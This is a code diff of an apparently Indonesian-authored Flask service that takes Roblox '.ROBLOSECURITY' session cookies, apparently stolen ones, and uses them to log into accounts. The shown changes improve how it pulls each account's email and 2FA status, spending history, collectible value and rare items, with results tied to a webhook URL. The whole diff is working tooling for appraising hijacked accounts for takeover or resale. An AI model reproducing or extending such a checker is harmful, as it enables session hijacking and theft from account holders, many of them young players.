@@ -50,12 +50,23 @@ def get_user_avatar(user_id):
     return default_avatar
 
 def process_single_cookie(cookie, webhook_url):
-    cookies_header = { '.ROBLOSECURITY': cookie.strip() }
-    headers = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
+    clean_cookie = cookie.strip()
+    if not clean_cookie.startswith(".ROBLOSECURITY="):
+        cookies_header = { '.ROBLOSECURITY': clean_cookie }
+    else:
+        # Handle if cookie string includes key name
+        actual_val = clean_cookie.split("=")[1] if "=" in clean_cookie else clean_cookie
+        cookies_header = { '.ROBLOSECURITY': actual_val }
+
+    headers = { 
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Referer": "https://www.roblox.com/"
+    }
+    
     try:
-        user_info_res = requests.get("https://users.roblox.com/v1/users/authenticated", cookies=cookies_header, headers=headers, timeout=5)
+        user_info_res = requests.get("https://users.roblox.com/v1/users/authenticated", cookies=cookies_header, headers=headers, timeout=6)
         if user_info_res.status_code != 200:
-            return {"status": "invalid", "cookie": cookie[:20] + "..."}
+            return {"status": "invalid", "cookie": clean_cookie[:20] + "..."}
         
         user_data = user_info_res.json()
         user_id = user_data.get('id')
@@ -92,12 +103,13 @@ def process_single_cookie(cookie, webhook_url):
         except:
             pass
 
+        # Perbaikan Endpoint Email Status
         email_status = "Not Verified"
         try:
             email_res = requests.get("https://accountinformation.roblox.com/v1/email", cookies=cookies_header, headers=headers, timeout=5)
             if email_res.status_code == 200:
                 e_data = email_res.json()
-                is_verified = e_data.get('isVerified', False)
+                is_verified = e_data.get('verified', False) or e_data.get('isVerified', False)
                 email_address = e_data.get('emailAddress', '')
                 if is_verified:
                     email_status = f"Verified ({email_address})" if email_address else "Verified"
@@ -106,21 +118,26 @@ def process_single_cookie(cookie, webhook_url):
         except:
             pass
 
+        # Perbaikan Endpoint 2FA / A2F Status
         has_a2f = False
         try:
             a2f_res = requests.get(f"https://twostepverification.roblox.com/v1/users/{user_id}/configuration", cookies=cookies_header, headers=headers, timeout=5)
             if a2f_res.status_code == 200:
                 a2f_data = a2f_res.json()
-                if a2f_data.get('email', {}).get('isEnabled', False) or a2f_data.get('authenticator', {}).get('isEnabled', False) or a2f_data.get('securityKey', {}).get('isEnabled', False):
+                if (a2f_data.get('email', {}).get('isEnabled', False) or 
+                    a2f_data.get('authenticator', {}).get('isEnabled', False) or 
+                    a2f_data.get('securityKey', {}).get('isEnabled', False) or
+                    a2f_data.get('isEnabled', False)):
                     has_a2f = True
         except:
             pass
 
+        # Perbaikan Spent History & Game
         total_game_spent = 0
         game_spending_map = {}
         game_universe_map = {}
         try:
-            spending_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/transactions?transactionType=Purchases&limit=50", cookies=cookies_header, headers=headers, timeout=5)
+            spending_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/transactions?transactionType=Purchases&limit=100", cookies=cookies_header, headers=headers, timeout=5)
             if spending_res.status_code == 200:
                 for tx in spending_res.json().get('data', []):
                     currency = tx.get('currency', {})
@@ -128,7 +145,7 @@ def process_single_cookie(cookie, webhook_url):
                     if amount < 0:
                         amt_abs = abs(amount)
                         details = tx.get('details', {})
-                        game_name = details.get('name', 'Roblox Item')
+                        game_name = details.get('name', 'Roblox Item / Game')
                         universe_id = details.get('universeId')
                         if universe_id:
                             game_universe_map[game_name] = universe_id
@@ -143,6 +160,7 @@ def process_single_cookie(cookie, webhook_url):
             icon_url = get_game_icon(u_id) if u_id else "https://tr.rbxcdn.com/3943ed2d7908c104bfd9d24268e390c5/150/150/Image/Png"
             spent_history_list.append({"name": gname, "spent": spent_amt, "icon": icon_url})
 
+        # Perbaikan Recent Games
         recent_games_list = []
         try:
             games_res = requests.get(f"https://games.roblox.com/v2/users/{user_id}/games?limit=3&sortOrder=Desc", headers=headers, timeout=5)
@@ -158,7 +176,6 @@ def process_single_cookie(cookie, webhook_url):
         rap_total = 0
         has_korblox = False
         has_headless = False
-        animation_list = []
 
         try:
             collectibles_res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=100", headers=headers, timeout=5)
@@ -171,11 +188,14 @@ def process_single_cookie(cookie, webhook_url):
         except:
             pass
 
+        # Perbaikan Animations Inventory
+        animation_list = []
         try:
-            bundles_res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/inventory/38?limit=4", headers=headers, timeout=5)
-            if bundles_res.status_code == 200:
-                for b in bundles_res.json().get('data', []):
-                    b_id = b.get('assetId')
+            # Asset type 38 = Animations / Bundles
+            inv_res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/inventory/38?limit=10", cookies=cookies_header, headers=headers, timeout=5)
+            if inv_res.status_code == 200:
+                for b in inv_res.json().get('data', []):
+                    b_id = b.get('assetId') or b.get('id')
                     b_name = b.get('name', 'Animation Pack')
                     b_icon = get_asset_icon(b_id)
                     animation_list.append({"name": b_name, "icon": b_icon})
@@ -231,7 +251,7 @@ def process_single_cookie(cookie, webhook_url):
             "headless": has_headless
         }
     except Exception as e:
-        return {"status": "error", "cookie": cookie[:20] + "...", "message": str(e)}
+        return {"status": "error", "cookie": clean_cookie[:20] + "...", "message": str(e)}
 
 @app.route('/api/check', methods=['POST'])
 def run_check_mode():
